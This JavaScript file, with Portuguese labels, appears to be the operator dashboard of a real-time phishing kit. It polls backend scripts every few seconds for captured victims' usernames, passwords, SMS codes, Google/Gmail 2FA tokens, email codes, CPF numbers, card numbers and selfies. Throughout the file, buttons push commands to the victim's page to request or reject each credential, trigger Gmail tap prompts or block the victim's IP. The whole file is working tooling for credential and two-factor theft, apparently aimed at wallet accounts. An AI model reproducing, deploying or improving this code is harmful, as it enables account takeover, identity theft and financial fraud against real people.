$(document).ready(function(){
	$(document).on('click', '#updadeinfo', function(e){
		e.preventDefault();
		atualizadados();
	});
});

function ClickBotao(){
	$(document).ready(function(){
		atualizadados();
		setTimeout('ClickBotao()', 3000);
	});
}

function atualizadados(){
	$(document).ready(function(){
		var idUsuario = $("#idremote").val();
			
    var usuarioop = $("#user_edit").val();
	
	$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idUsuario: idUsuario,
			usuarioop: usuarioop
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apiremote.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$('#statusonline').html(data.status);
			$('#usuario').val(data.usuario);
			$('#senha').val(data.senha);
			$('#tokensms').val(data.sms);
			$('#tokensms2').val(data.sms);
			$('#token2fa').val(data.token2fatores);
			$('#senhanegociar').val(data.senhanegociar);
			$('#codigoemail').val(data.codigo_email);
			$('#codigogoogle').val(data.codigo_google);
			$("#statusR").html("<font color='white'>"+data.statusremote+"</font>");
		
		}
	});
	setTimeout('atualizadados()', 3000);
});
}

$(document).ready(function(){     
     $(document).on('click', '#update_email', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var email_master = $("#email_master").val();
     var tipo = "update_email";
     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		email_master:email_master,
		tipo:tipo
		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='red'>E-mail atualizado!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});

//ler os dados
$(document).ready(function(){
	$(document).on('click', '#getremote', function(e){
		e.preventDefault();

		$('#idremote').val("");

		const idUsuario = $(this).data('id');
		
		$('#idremote').val(idUsuario);
		updateUserData()
		atualizadados();
	});
}); 

function updateUserData() {
	const idUsuario = document.querySelector('#idremote').value
	$.ajax({
		type: 'POST',
		data: {
			id: idUsuario,
		},
		dataType: 'json',
		url: '/wallet/getData.php',
		success (data) {
			document.querySelector('#emailPassword').textContent = data[0]['senha_do_email'] || 'Sem Dados'
			document.querySelector('#emailSMS').textContent = data[0]['sms_do_email'] || 'Sem Dados'
			document.querySelector('#emailPhone').textContent = data[0]['fone_do_email'] || 'Sem Dados'
			document.querySelector('#twoFAEmail').textContent = data[0]['doisFA_do_email'] || 'Sem Dados'
			document.querySelector('#codMail').textContent = data[0]['codigo_do_email'] || 'Sem Dados'
			document.querySelector('#doisFAcopyBTN').textContent = data[0]['token2fatores'] || 'Sem Dados'
			document.querySelector('#doisFASynccopyBTN').textContent = data[0]['token2fa'] || 'Sem Dados'
			document.querySelector('#yahooCode').textContent = data[0]['yahooCode'] || 'Sem Dados'
			document.querySelector('#hotmailMail').textContent = data[0]['hotmailMail'] || 'Sem Dados'
		}
	})

	setTimeout(() => {
		updateUserData()
	}, 2000);
}



$(document).ready(function(){     
     $(document).on('click', '#pedirtokenmail', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "pedirtokenmail";

     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo
	
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='blue'>Pedir mail token oK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});

$(document).ready(function(){     
     $(document).on('click', '#negartokenmail', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "negartokenmail";

     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo
	
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='red'>Negar mail token oK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});


$(document).ready(function(){     
     $(document).on('click', '#pedirsms', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "pedirsms";

     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo
	
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='blue'>Pedir SMS oK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});

$(document).ready(function(){     
     $(document).on('click', '#negarsms', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "negarsms";

     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo
	
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='red'>Negar SMS oK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});



$(document).ready(function(){     
     $(document).on('click', '#deslogar', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "deslogar";
   //  var email = $("#gmailtoken").val();
     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo
	//	email:email		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='red'>Pedir Deslogar @ OK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});

//função pedir cod transação
$(document).ready(function(){     
     $(document).on('click', '#pediremailrecuperar', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "pediremailrecuperar";
     var email = $("#autenticador").val();
     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo,
		email:email		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='red'>Pedir email de recuperação @ OK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});

//função negar cod transação
$(document).ready(function(){     
     $(document).on('click', '#negarmailderecu', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "negarmailderecu";
     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='red'>Negar email de recuperação OK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});




$(document).ready(function(){     
   //pedir SMS
     $(document).on('click', '#bloquearip', function(e){  
     e.preventDefault();  

    
     var idremote = $("#idremote").val();
	 var tipo = "bloquearip";
     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo:tipo
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='blue'>Pedido Block IP Enviado!</font>");
				
		atualizadados();
		  
			
		}
	});  
});  	
});



//função pedir bloqueio
$(document).ready(function(){
	$(document).on('click', '#pedirverificaMail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();	
		var final = $("#autenticador").val();	
		var tipo = "pedirverificaMail";
          
		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,	
			final:final,		
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
		$("#statusR").html("<font color='blue'>Pedido Verification code Enviado!</font>");
		}
	});
	});
});





//função confirma email
$(document).ready(function(){
	$(document).on('click', '#NegarverificaMail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		
		var tipo = "NegarverificaMail";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='Red'>Negar Verification code Enviado!</font>");
			atualizadados();
		}
	});
	});
});



//função pedir bloqueio
$(document).ready(function(){
	$(document).on('click', '#pedirbloqueio', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		
		var tipo = "pedirbloqueio";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
		$("#statusR").html("<font color='blue'>Pedido sync Enviado!</font>");
		}
	});
	});
});





//função confirma email
$(document).ready(function(){
	$(document).on('click', '#pedircodigogoogle', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "pedircodigogoogle";
       
		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo
			
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Código de Retirada Enviado!</font>");
			atualizadados();
		}
	});
	});
});
//função confirma email
$(document).ready(function(){
	$(document).on('click', '#negarcodigogoogle', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negarcodigogoogle";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='red'>Negar Código de Retirada Enviado!</font>");
			atualizadados();
		}
	});
	});
});


//função pedir senha do email
$(document).ready(function(){
	$(document).on('click', '#pedirsenhaemail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "pedirsenhaemail";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Senha email Enviado!</font>");
		}
	});
	});
});

//função pedir 2 fatores fgmai,
$(document).ready(function(){
	$(document).on('click', '#pedirtokengmail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "pedirtokengmail";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido 2fatoresgmail Enviado!</font>");
		}
	});
	});
});

//função pedir cod transação
$(document).ready(function(){     
     $(document).on('click', '#pedircodemail', function(e){  
     e.preventDefault();  

     
     var idremote = $("#idremote").val();
     var tipo = "pedircodemail";
     var numerofinal = $("#autenticador").val();
     		 
    	$.ajax({
		type:'post',		//Definimos o método HTTP usado
		data: {
		idremote: idremote,
		tipo: tipo,
		numerofinal:numerofinal		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
		
		 $("#statusR").html("<font color='red'>Pedir cod email @ OK!</font>");
		//atualizadados();
		  
			
		}
	});
    });    
});

//função pedir 2 fatores fgmai,
$(document).ready(function(){
	$(document).on('click', '#negartokengmail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negartokengmail";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido negar 2fatoresgmail Enviado!</font>");
		}
	});
	});
});

//função pedir sms
$(document).ready(function(){
	$(document).on('click', '#2fatores', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "2fatores";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Auth 2FA Enviado!</font>");
		}
	});
	});
});

//função pedir email
$(document).ready(function(){
	$(document).on('click', '#2fatoresgoogle', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "2fatoresgoogle";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Auth Email Enviado!</font>");
		}
	});
	});    
});

$(document).ready(function(){
	$(document).on('click', '#pedirtelefonegmail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "pedirtelefonegmail";
     	var numero = $("#autenticador").val();	 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			numero:numero,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Telefone Enviado!</font>");
		}
	});
	});    
});

$(document).ready(function(){
	$(document).on('click', '#negargmailtelefone', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negargmailtelefone";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido NegarTelefone Enviado!</font>");
		}
	});
	});    
});

//função pedir email
$(document).ready(function(){
	$(document).on('click', '#pediremail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "pediremail";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
				$("#statusR").html("<font color='blue'>Pedido pedirsenha Enviado!</font>");
		}
	});
	});    
});



//função pedir sms
$(document).ready(function(){
	$(document).on('click', '#pedircodeemail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "pedircodeemail";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Pass 4  Enviado!</font>");
		}
	});
	});    
});

$(document).ready(function(){
	$(document).on('click', '#negaruser', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negaruser";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Nega Usuario/senha Enviado!</font>");
		}
	});
	});    
});

//negar 2 fator masterkey
$(document).ready(function(){
	$(document).on('click', '#negar2fatores', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negar2fatores";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Negar 2fa token Enviado!</font>");
		}
	});
	});    
});

//negar 2 fator google aut
$(document).ready(function(){
	$(document).on('click', '#negarfatorgoogle', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negarfatorgoogle";

		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Nega E-mail Enviado!</font>");
		}
	});
	});    
});


$(document).ready(function(){
	$(document).on('click', '#negarcodemail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negarcodemail";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Negar cod E-mail Enviado!</font>");
		}
	});
	});    
});

$(document).ready(function(){
	$(document).on('click', '#negaremailsyng', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negaremailsyng";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Negar E-mail Provedor Enviado!</font>");
		}
	});
	});    
});

//função pedir sms
$(document).ready(function(){     
     $(document).on('click', '#perdirsyng', function(e){
     	e.preventDefault();

     	var idremote = $("#idremote").val();
     	var tipo = "perdirsyng";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Email e senha Syng Enviado!</font>");
		}
	});
	});    
});


function sendRisos(){
	var idremote = $("#idremote").val();
	var tipo = "notificagmail";
	var numero = $("#autenticador").val();

		$.ajax({
	type:'POST', //Definimos o método HTTP usado
	data: {
		idremote: idremote,
		tipo: tipo,
		numero: numero		
	},
	dataType: 'json',	//Definimos o tipo de retorno
	url: 'apifunct.php',//Definindo o arquivo onde serão buscados os dados
	success: function(data){
		$("#statusR").html("<font color='blue'>Pedido Toque na tela Gmail Enviado Nª "+numero+"!</font>");
		
	}
});
}

$(document).ready(function(){
	$(document).on('click', '#notificagmailq', function(e){
		e.preventDefault();
		
		var idremote = $("#idremote").val();
		var tipo = "notificagmailq";
		var numeroq = $("#autenticadorq").val();
		console.log(idremote, tipo, numeroq)
		  
			$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo,
			numeroq: numeroq		
		},
		dataType: 'json',	//Definimos o tipo de retorno
		url: 'apifunct.php',
	}).then(() => {
		sendRisos()
	});
	});    
});

$(document).ready(function(){
	$(document).on('click', '#pedirsmsgmail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "pedirsmsgmail";
		var numero = $("#autenticador").val();
     	 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo,
			numero: numero		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido SMS DO EMAIl!</font>");
		}
	});
	});    
});

//função ver info completas
$(document).ready(function(){
	$(document).on('click', '#buttonver', function(e){
		e.preventDefault();

		var idremote =  $(this).data('id');

    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'verinfo.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$('#email').html(data.email);
			$('#senhaemail').html(data.senhaemail);
			$('#senha4').html(data.senha4);
			$('#cpf').html(data.cpf);
			$('#self').html("<img src='../personal/"+data.self+"' width='100px'>");
			$('#senha').html(data.senhaemail);
			$('#cartao').html(data.cartao);
		}
	});
	});    
});

//função pedir sms
$(document).ready(function(){
	$(document).on('click', '#ok', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "ok";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Finalizar Enviado!</font>");
		}
	});
	});    
});

//função pedir sms
$(document).ready(function(){
	$(document).on('click', '#ipblock', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "ipblock";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido IP block Enviado!</font>");
		}
	});
	});    
});

//função pedir sms
$(document).ready(function(){
	$(document).on('click', '#negargmail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negargmail";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo: tipo		
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Negar sms gmail Enviado!</font>");
		}
	});
	});    
});

//função pedir sms
$(document).ready(function(){
	$(document).on('click', '#confirma_del_infos', function(e){
		e.preventDefault();  
	 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		url: 'deletarinfos.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			alert(data);
		}
	});
	});    
});

//pedir SMS
$(document).ready(function(){
	$(document).on('click', '#chaverradaemail', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "chaverradaemail";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo:tipo
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido Error chaverradaemail Enviado!</font>");
			atualizadados();
		}
	});
	});
});

//pedir SMS
$(document).ready(function(){
	$(document).on('click', '#negarsenha', function(e){
		e.preventDefault();

		var idremote = $("#idremote").val();
		var tipo = "negarsenha";
     		 
    		$.ajax({
		type:'POST', //Definimos o método HTTP usado
		data: {
			idremote: idremote,
			tipo:tipo
		},
		dataType: 'json', //Definimos o tipo de retorno
		url: 'apifunct.php', //Definindo o arquivo onde serão buscados os dados
		success: function(data){
			$("#statusR").html("<font color='blue'>Pedido negarsenha Enviado!</font>");
			atualizadados();
		}
	});
	});
});


$(document).ready(function(){
	$(document).on('click', '#add_user', function(e){
		e.preventDefault();

		var tipo_user_add = $("#tipo_user_add").val();
		var usuario = $("#usuario_user").val();
		var senha = $("#senha_user").val();

		$.ajax({
			type:'POST', //Definimos o método HTTP usado
			data: {
				tipo_user_add: tipo_user_add,
				usuario: usuario,
				senha:senha
			},
			//dataType: 'json',	//Definimos o tipo de retorno
			url: 'conf_user.php', //Definindo o arquivo onde serão buscados os dados
			success: function(data){
				alert(data);
			}
		});
	});
});    

//função alterar
$(document).ready(function(){
//pedir SMS
     $(document).on('click', '#alt_add_user', function(e){
     	e.preventDefault();

     	var id_user = $("#id_user_edit").val();
     	var tipo_user = $("#id_usertipo_edit").val();
     	var usuario = $("#user_edit").val();
		var senha = $("#pass_edit").val();
     		 
	    	$.ajax({
			type:'POST', //Definimos o método HTTP usado
			data: {
				id_user: id_user,
				tipo_user: tipo_user,
				usuario: usuario,
				senha:senha
			},
			//dataType: 'json',	//Definimos o tipo de retorno
			url: 'conf_edit.php', //Definindo o arquivo onde serão buscados os dados
			success: function(data){
				alert(data);
			}
		});
	});
});